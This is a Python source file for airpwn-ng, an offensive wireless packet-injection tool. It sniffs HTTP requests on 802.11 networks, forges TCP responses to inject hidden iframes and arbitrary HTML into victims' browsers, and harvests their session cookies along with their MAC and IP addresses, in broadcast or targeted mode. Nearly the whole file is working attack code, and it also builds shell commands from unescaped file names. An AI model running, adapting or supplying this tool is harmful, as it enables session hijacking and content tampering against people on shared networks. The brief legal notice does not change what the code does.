#! /usr/bin/env python

##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: airpwn-ng
## Copyright (C) <2015> <stryngs> - orginal bash script
## Python implementation <Jack64>

##  This program is free software: you can redistribute it and/or modify
##  it under the terms of the GNU General Public License as published by
##  the Free Software Foundation, either version 3 of the License, or
##  (at your option) any later version.

##  This program is distributed in the hope that it will be useful,
##  but WITHOUT ANY WARRANTY; without even the implied warranty of
##  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
##  GNU General Public License for more details.

##  You should have received a copy of the GNU General Public License
##  along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##

##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Thoughts... ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## I consider any script/program I write to always be a work in progress.
## Please send any tips/tricks/streamlining ideas/comments/kudos via email to: info [AT] ethicalreporting.org

## Comments written with a triple # are notes to myself, please ignore them.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.

## toast and his excellent work with the original concept of airpwn.  airpwn-ng wouldn't exist without the original work done by him...
## Thank you for allowing me to have the privilege of the original name.  I hope this script lives up to what it should be!

## The wireshark community for it's excellent String Matching Capture Filter Generator
	# https://www.wireshark.org/tools/string-cf.html

## Jack64 for his excellent help and eagerness to improve this.  Thank you for the help mate...

## blind for the excellent work at finding the wireshark URL that helped with parsing the GET / function for airpwn-ng

## xmnr for the idea to issue a nice of -20 throughout the script

## Kryczek for the idea to use airtun-ng as the last mile solution for injection

## The "Community" for always working towards improving the existing.....
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


from threading import Thread
from Queue import Queue, Empty
from scapy.all import *
import subprocess,os,sys,argparse,signal

#SET GLOBALS
#### Some of these GLOBALS are declared in main()
#### Why the doubles, main() is first yeah?...
global websites
global injectfile
global m_iface
global i_iface
global covert
global TARGETED
global HITCOUNTER
global mac_list
global EXCLUSION
global MONITOR
global EXCLUDE_LIST
MONITOR=0
EXCLUSION=0
EXCLUDE_LIST=[]
mac_list=[]
TARGETED=0
HITCOUNTER=2
covert=0
websites=[]
#### Is this an example of quicksetting a default so that wargames is chosen by default for the inject if inject is not specified??
#### It seems that an "inject" is not required if building on they fly, so why set this unless the above applies?
injectfile="wargames"

m_iface = "tap0"

#### wlan3 as default?  Perhaps 0 or 1, but 3???
i_iface = "wlan3"

m_finished = False
t_finished = False

#### m_dst is not used, seems like asd variable
#### m_dst = "192.168.1.68"

#
# Bash colors class
#
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

#
# Handle CTRL+C
#
def signal_handler(signal, frame):
        print bcolors.FAIL+'\n[!] Stopping injection and exiting airpwn-ng ...'+bcolors.ENDC
        sys.exit(0)

#ADD GLOBAL SIGNAL HANDLER
signal.signal(signal.SIGINT, signal_handler)

#
# Processes injection file and returns a hex encoded payload
#
def load_injection(injectionfile):
	#Check if file TEMPLOG exists, throw error if true, proceed if false
	proceed=0
	try:
		f = open('TEMPLOG','r')
		proceed=0
	except IOError:
		proceed=1
	if (proceed==0):
		print bcolors.WARNING+"[!] You have a file named TEMPLOG in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
		exit(1)

	#Uses bash to hex encode payload (--by stryngs)
	cmd='''echo "0x$(cat '''+injectionfile+''' | xxd -g1 -ps | fold -w2 | paste -sd ' ')" > TEMPLOG'''
	os.system(cmd)
	f = open('TEMPLOG','r')
	inject=f.read().strip()
	f.close()
	os.system("rm TEMPLOG")
	return inject



	
#
# Calls packit and injects the payload to the victim
#
def start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum):
	cmd='nice -n -20 packit -i '+i_iface+' -R -nnn -a '+str(acknum)+' -D '+str(vicport)+' -F PA -q '+str(seqnum)+' -S '+str(svrport)+' -d '+vicip+' -s '+svrip+' -X '+rtrmac+' -Y '+vicmac+' -p "'
	cmd+=injection
	cmd+='" >/dev/null 2>&1'
	print bcolors.OKBLUE+"[*] Injecting Packet to victim "+vicmac+bcolors.ENDC
	os.system(cmd)


#### Perhaps this is a bottleneck, we can use ngrep to rip cookies in a more efficient manner if this is a bottleneck.
#### Can we make this optional for beta testing?
#
# Processes incoming packets to check for cookies
#
def proc_packet(packet):
	packet1=packet
	# EXTRACT RAW PAYLOAD FROM PACKET
	ret2 = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
	if (len(ret2.strip())>0):
		ret = "\n[*] RECEIVED COOKIE\n"
		arr=ret2.split("\n")
		host=""
		cookie=""
		for line in arr:
			if ('Cookie' in line):
				cookie=line
			if ('Host' in line):
				host=line.split()[1]
		global websites
		#CHECK IF THE COOKIE BELONGS TO ANY OF OUR TARGET WEBSITES
		for website in websites:
			if (host.lower().strip() in website.lower() and len(host.lower().strip())>2):
				TARGET_IN_LIST=0
				#BROADCAST MODE
				if (TARGETED==0):
					if (len(cookie.strip())==0):
						if (MONITOR):
							print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
						else:
							print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
					else:
						print ret
						if (MONITOR):
							print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
						else:
							print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
							print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
					global m_finished
					global t_finished
					global HITCOUNTER
				#TARGETED MODE
				else:
					for m_mac in mac_list:
						#MONITOR MODE NEEDED
						if (MONITOR):
							if (m_mac.lower()==packet.getlayer(Dot11).addr2.lower()):
								TARGET_IN_LIST=1
								if (len(cookie.strip())==0):
									if (MONITOR):
										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
									else:
										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
								else:
									print ret
									if (MONITOR):
										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
									else:
										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
						else:
							if (m_mac.lower()==packet.getlayer(Ether).src.lower()):
								TARGET_IN_LIST=1
								if (len(cookie.strip())==0):
									if (MONITOR):
										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Dot11).src+bcolors.ENDC
									else:
										print bcolors.WARNING+"[!] No cookie found for website",host.lower(),"on client",packet.getlayer(Ether).src+bcolors.ENDC
								else:
									print ret
									if (MONITOR):
										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Dot11).addr2+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
									else:
										print bcolors.OKGREEN+"[*] Victim MAC - ",packet.getlayer(Ether).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Victim IP -",packet.getlayer(IP).src+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Host -",host+bcolors.ENDC
										print bcolors.OKGREEN+"[*] Cookie Data -",cookie.strip(),"\n"+bcolors.ENDC
				# IF NOT TARGETED, USE -c <count> TO GRAB HTICOUNTER_STATIC NUMBER OF COOKIES FROM EACH WEBSITE IN --websites LIST
				if (TARGETED == 0):
					if (HITCOUNTER>0):
						if (len(cookie.strip())==0):
							HITCOUNTER=0
							m_finished = True
							t_finished = True
						else:
							HITCOUNTER=HITCOUNTER-1
							if (HITCOUNTER==0):
								m_finished = True
								t_finished = True
					else:
						m_finished = True
						t_finished = True
#					t_finished = True
				#IF IT'S A TARGETED ATTACK, HITCOUNTER HOLDS THE NUMBER OF CLIENTS SO IT ALWAYS TRIES TO GRAB 1 COOKIE PER TARGET PER WEBSITE
				#TODO: SAVE COOKIES SOMEHOW TO DISCARD REPEATED (Client,Cookie) COMBINATIONS
				else:
					if (TARGET_IN_LIST):
						if (HITCOUNTER>0):
							HITCOUNTER=HITCOUNTER-1
							if (HITCOUNTER==0):
								m_finished = True
								t_finished = True
						else:
							m_finished = True
							t_finished = True
				break




def get_packet_host(packet):
	host=""
	packet1=packet
	# EXTRACT RAW PAYLOAD FROM PACKET
	try:
		ret2 = "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
		if (len(ret2.strip())>0):
			ret = "\n[*] RECEIVED COOKIE\n"
			arr=ret2.split("\n")
			cookie=""
			for line in arr:
				if ('Host' in line):
					host=line.split()[1]
	except:
		return 0
	if (len(host)>0):
		return host
	else:
		return 0
#
# Does some processing to check if the packet is a GET request to try to sniff out the Cookie
#
def GET_print(packet):
        http_packet=str(packet)
	try:
		getarg=packet.load.split()[1]
	except:
		getarg="NULL"
        if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html") or (getarg.find("/") and len(getarg.strip())<2))):
		if packet.haslayer(IP):
			proc_packet(packet)


def expand(x):
    yield x
    while x.payload:
        x = x.payload
        yield x

#
# Does some processing to check if the packet is a GET request. If so, grabs packet info and injects the payload
#
def http_header(packet):
        http_packet=str(packet)
	global EXCLUSION
	global TARGETED
	global MONITOR
	global EXCLUDE_LIST
	if (EXCLUSION==1):
		try:
			host=get_packet_host(packet)
			if (not host):
				ignore=1
			else:
				for item in EXCLUDE_LIST:
					if (host in item):
#						print "[DEBUG] Client is hitting exluded host",host
						return 0
		except:
			print "FAILED TO GET PACKET HOST"
	else:
		pass
	# LOADS THE REQUEST, specifically whatever is after GET
	try:
		getarg=packet.load.split()[1]
	except:
		getarg="NULL"
	else:
		pass
	#TODO: Improve this check and implement --covert mode with stricter checks
        if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html")) ):
		#MONITOR MODE:
		if (MONITOR):
			if ("GET" in packet.sprintf("{Raw:%Raw.load%}\n") and packet.haslayer(IP) and packet.haslayer(TCP)):
#				print list(expand(packet))
				vicmac=packet.getlayer(Dot11).addr2
				rtrmac=packet.getlayer(Dot11).addr1
				vicip=packet.getlayer(IP).src
				svrip=packet.getlayer(IP).dst
				vicport=packet.getlayer(TCP).sport
				svrport=packet.getlayer(TCP).dport
				try:
					size=len(packet.getlayer(TCP).load)
				except:
					size=20
				acknum=str(int(packet.getlayer(TCP).seq)+size)
				seqnum=packet.getlayer(TCP).ack
				start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
		else:
			if (packet.haslayer(IP)):
#			ls(packet)
#			return
				process=0
				if (TARGETED):
					for m_mac in mac_list:
						if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
							process=1
				else:
					process=1
				if (process==1):
					vicmac=packet.getlayer(Ether).src
					rtrmac=packet.getlayer(Ether).dst
					vicip=packet.getlayer(IP).src
					svrip=packet.getlayer(IP).dst
					vicport=packet.getlayer(TCP).sport
					svrport=packet.getlayer(TCP).dport
					try:
						size=len(packet.getlayer(TCP).load)
					except:
						size=20
					acknum=str(int(packet.getlayer(TCP).seq)+size)
					seqnum=packet.getlayer(TCP).ack
					start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
	
#
# Packet injection for targeted mode, only injects if the MAC address is present in mac_list, as defined by -t
#
def process_targeted_packet(packet):
        http_packet=str(packet)
	try:
		getarg=packet.load.split()[1]
	except:
		getarg="NULL"
	global EXCLUSION
	global EXCLUDE_LIST
	if (EXCLUSION==1):
		try:
			host=get_packet_host(packet)
			if (not host):
				ignore=1
			else:
				for item in EXCLUDE_LIST:
					if (host in item):
						print "[DEBUG] Client is hitting exluded host",host
						return 0
		except:
			print "FAILED TO GET PACKET HOST"
	else:
		pass
        if (http_packet.find('GET') and (getarg.find("php") or getarg.find("asp") or getarg.find("htm") or getarg.find("html") or (getarg.find("/") and len(getarg.strip())<2))):
		if packet.haslayer(IP):
			for m_mac in mac_list:
				#MONITOR MODE:
				if (MONITOR):
					if ("GET" in packet.sprintf("{Raw:%Raw.load%}\n") ):
						if (packet.getlayer(Dot11).addr2==m_mac.lower()):
#							print list(expand(packet))
							vicmac=packet.getlayer(Dot11).addr2
							rtrmac=packet.getlayer(Dot11).addr1
							vicip=packet.getlayer(IP).src
							svrip=packet.getlayer(IP).dst
							vicport=packet.getlayer(TCP).sport
							svrport=packet.getlayer(TCP).dport
							try:
								size=len(packet.getlayer(TCP).load)
							except:
								size=20
							acknum=str(int(packet.getlayer(TCP).seq)+size)
							seqnum=packet.getlayer(TCP).ack
							start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
		
				else:
					if (packet.getlayer(Ether).src==m_mac.lower()):
						if (packet.haslayer(IP)):
			#			ls(packet)
			#			return
							process=0
							if (TARGETED):
								for m_mac in mac_list:
									if (packet.getlayer(Ether).src.lower()==m_mac.lower()):
										process=1
							else:
								process=1
							if (process==1):
								vicmac=packet.getlayer(Ether).src
								rtrmac=packet.getlayer(Ether).dst
								vicip=packet.getlayer(IP).src
								svrip=packet.getlayer(IP).dst
								vicport=packet.getlayer(TCP).sport
								svrport=packet.getlayer(TCP).dport
								try:
									size=len(packet.getlayer(TCP).load)
								except:
									size=20
								acknum=str(int(packet.getlayer(TCP).seq)+size)
								seqnum=packet.getlayer(TCP).ack
								start_injection(vicmac,rtrmac,vicip,svrip,vicport,svrport,acknum,seqnum)
								break


#
# Sets up the sniffer thread using stryngs's tcpdump filter
#
def threaded_sniff_target(q):
	global MONITOR
	if (MONITOR):
		sniff(iface = m_iface, prn = lambda x : q.put(x))
	else:
		sniff(iface = m_iface,filter = 'tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420', prn = lambda x : q.put(x))

#
# Sniff in broadcast mode
#
def threaded_sniff():
	q = Queue()
	sniffer = Thread(target = threaded_sniff_target, args = (q,))
	sniffer.daemon = True
	sniffer.start()
	while (not m_finished):
		try:
			pkt = q.get(timeout = 1)
			http_header(pkt)
			GET_print(pkt)
			q.task_done()
		except Empty:
			pass

#
# Sniff in targeted mode
#
def threaded_targeted_sniff():
	q = Queue()
	sniffer = Thread(target = threaded_sniff_target, args = (q,))
	sniffer.daemon = True
	sniffer.start()
	while (not t_finished):
		try:
			pkt = q.get(timeout = 1)
			if (not m_finished):
				process_targeted_packet(pkt)
			GET_print(pkt)
			q.task_done()
		except Empty:
			pass



#
# iframe HTML generation function -- currently in use
#
def create_iframe(website,id):
	iframe='''<iframe id="iframe'''+id+'''" width="1" scrolling="no" height="1" frameborder="0" src=""></iframe>\n'''
	return iframe

#
# Another iframe HTML generation function -- not in use
#
def create_iframe_injection(injects):
	proceed=0
	try:
		f = open('INJECTS_TEMP','r')
		proceed=0
	except IOError:
		proceed=1
	if (proceed==0):
		print bcolors.WARNING+"[!] You have a file named INJECTS_TEMP in this directory. Please rename it, as it is used by airpwn-ng for payload generation"
		exit(1)
	f = open('INJECTS_TEMP','w')
	f.write('\n')
	f.write('''<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\n''')
	f.write('''<html xmlns="http://www.w3.org/1999/xhtml">\n''')
	f.write('''<div style="position:absolute;top:-9999px;left:-9999px;visibility:collapse;">\n''')
	f.write(injects)
	f.write('</div>')
	f.close()
	global injection
	injection=load_injection('INJECTS_TEMP')
#	os.system("cat INJECTS_TEMP")
	os.system("rm INJECTS_TEMP")
	return injection


#
# Generates payloads for the --websites list and injects them sequentially (threaded injection probably screws things up, haven't tested though)
# TODO: If -t is not null, build a thread listening specifically for each client so you can get cookies faster for clients that are actively browsing
#
def target_attack():
	print bcolors.OKBLUE+"[*] Preparing iframes for injection..."+bcolors.ENDC
	WEB_INJECTS=[]
	iframes=""
	i=0
	for website in websites:
		print bcolors.OKBLUE+"[*] Trying to get cookie for",website+bcolors.ENDC

		#THIS GENERATES AN IFRAME WITH EMPTY SRC, TO BE FILLED IN LATER IN JAVASCRIPT TO BYPASS SOME RESTRICTIONS
		iframes=create_iframe(website,str(i))
		iframes+='''<script>\n'''
		iframes+='''function setIframeSrc'''+str(i)+'''() {\n'''
		iframes+='''var s = "'''+website+'''";\n'''
		iframes+='''var iframe1 = document.getElementById('iframe'''+str(i)+'''');\n'''
		iframes+='''if ( -1 == navigator.userAgent.indexOf("MSIE") ) {\n'''
		iframes+='''iframe1.src = s;\n'''
		iframes+='''}\nelse {\n'''
		iframes+='''iframe1.location = s;\n'''
	 	iframes+=''' }\n}\ntry{\nsetTimeout(setIframeSrc'''+str(i)+''', 10);\n} catch (err){\n}\n'''
		iframes+='''</script>\n'''
		global injection
		injection=create_iframe_injection(iframes)
		global m_finished
		global t_finished
		m_finished = False
		t_finished = False
		if (TARGETED==0):
			threaded_sniff()
		else:
			threaded_targeted_sniff()
		global HITCOUNTER
		global HITCOUNTER_STATIC
		HITCOUNTER=HITCOUNTER_STATIC
		i+=1



#
# Load the websites list into the global websites
#
def load_websites_targeted(websites_file):
	global websites
	websites=[]
	f = open(websites_file,'r')
	for line in f.readlines():
		if (line.strip()[0]!="#"):
			websites.append(line.strip())
	f.close()
	return websites


def main(args):
	#TODO:	CHECK DEPENDENCIES
	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"

	#### Globals because variables act like they do in C or something?
	global m_iface
	global MONITOR
	global i_iface
	global injection
	global websites
	global HITCOUNTER_STATIC
	global HITCOUNTER
	global EXCLUSION
	global EXCLUDE_LIST

	#### mon must exist, so why not set MONITOR=1 from the beginning?
	#### Currently MONITOR = 0 in the begin
	if ("mon" in args.m):
		MONITOR=1
	m_iface = args.m
	i_iface = args.i

	#CHECK FOR COOKIE COUNT
	if (args.c is not None):
		HITCOUNTER_STATIC=int(args.c)
		HITCOUNTER=HITCOUNTER_STATIC
	else:
		HITCOUNTER_STATIC=1
		HITCOUNTER=HITCOUNTER_STATIC

	#CHECK FOR EXCLUDED HOSTS
	if (args.exclude_hosts is not None):
		EXCLUSION=1
		EXCLUDE_LIST=args.exclude_hosts
	else:
		#### What is asd?  Only used here...
		asd=1

	#USE INJECT FILE
	if (args.injection is not None):
		injection=load_injection(args.injection)
		print bcolors.OKGREEN+"[+] Loaded injection file",args.injection+bcolors.ENDC
	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY
	#### Create what on the fly?  Do we have a template for the base?  i.e....
	#### Is there an iframe template, etc...
	else:
		injection=0
		websites=load_websites_targeted(args.websites)
		for website in websites:
			print bcolors.OKGREEN+"[+] Loaded target website ",website+bcolors.ENDC

	# BROADCAST MODE
	#### Nests suck, no way to "case???"
	if (args.t is None):
		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
		if (injection==0):
			target_attack()
		else:
#			print bcolors.OKBLUE+"[DEBUG] Injection Payload\n",injection+bcolors.ENDC
			threaded_sniff()
	# TARGETED MODE
	else:
		#ENABLE TARGETED MODE
		global TARGETED
		TARGETED=1
		if (len(args.t)==0):
			print bcolors.WARNING+"[!] You must specify at least one target MAC address with -t for targeted mode"
			exit(1)
		else:
			for target in args.t:
				print bcolors.OKGREEN+"[+] Adding target",target+bcolors.ENDC

		HITCOUNTER_STATIC=len(args.t)
		HITCOUNTER=HITCOUNTER_STATIC

		#LOAD TARGETS
		global mac_list
		mac_list=args.t

		if (injection==0):
			target_attack()
		else:
#			print bcolors.OKBLUE+"[DEBUG] Injection Payload\n",injection+bcolors.ENDC
			threaded_sniff()


#### I forget what this is called, but what the hell does it mean?
if __name__ == '__main__':


	#ARGUMENT PARSING
	parser = argparse.ArgumentParser(description='airpwn-ng - the new and improved 802.11 packet injector')

	group = parser.add_mutually_exclusive_group(required=True)
	group.add_argument('--injection',metavar='<filename>',help='File with your injection code')
	group.add_argument('--websites',metavar='<filename>',help='List of websites to sniff cookies from')

	parser.add_argument('-m',metavar='<interface>',required=True,help='Your monitor interface')
	parser.add_argument('-i',metavar='<interface>',required=True,help='Your injection interface')

	parser.add_argument('-t',nargs='*',metavar='<MAC address>',help='Target MAC addresses')

	#### An example list of how to be done would be helpful here:
	#### 127.0.0.1, 192.168.0.0/24, 192.168.1.100-200, 192-197.123.123.0/24, etc...
	parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='List of hosts to exclude from injection')

	parser.add_argument('-o',metavar='<outfile>',help='Output File')
	
	#### Number of cookies...  So like if the browser has 5 cookies for a domain, and you specify 4, then it only grabs 4?
	#### If true to above, then only the first four?  Random four, etc...
	#### Description needed
	parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')

	#### Describe covert...
	parser.add_argument('--covert',action='store_true',help='Uses less packets')
	args = parser.parse_args()
	main(args)


